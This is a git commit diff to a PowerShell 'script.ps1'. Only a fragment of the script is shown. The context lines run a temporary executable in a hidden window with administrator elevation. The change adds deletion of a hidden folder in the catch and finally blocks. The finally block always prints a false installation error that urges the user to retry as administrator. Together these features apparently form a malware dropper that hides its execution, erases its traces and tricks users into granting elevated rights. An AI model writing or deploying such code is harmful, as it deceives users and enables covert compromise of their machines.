af64118916480a57d20120a59c0623bf4f5abb78
el3ctro4ndre <marin.andrea@proton.me>
2025-02-17 22:20:43 +0100

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -47,12 +47,13 @@ try {
     Start-Sleep -Seconds 20
     Start-Process -FilePath $tempPath2 -WindowStyle $hiddenAttr -Verb $runAs
     Start-Sleep -Seconds 20
-    Remove-Item $hiddenFolder -Recurse -Force -ErrorAction $stopAction
     Set-Location $originalDirectory
 } catch {
     Set-Location $originalDirectory
+    Remove-Item $hiddenFolder -Recurse -Force -ErrorAction $stopAction
     Write-Host "An error occured during installation. Please try again as administrator."
     exit 1
 } finally {
+    Remove-Item $hiddenFolder -Recurse -Force -ErrorAction $stopAction
     Write-Host "An error occured during installation. Please try again as administrator."
 }
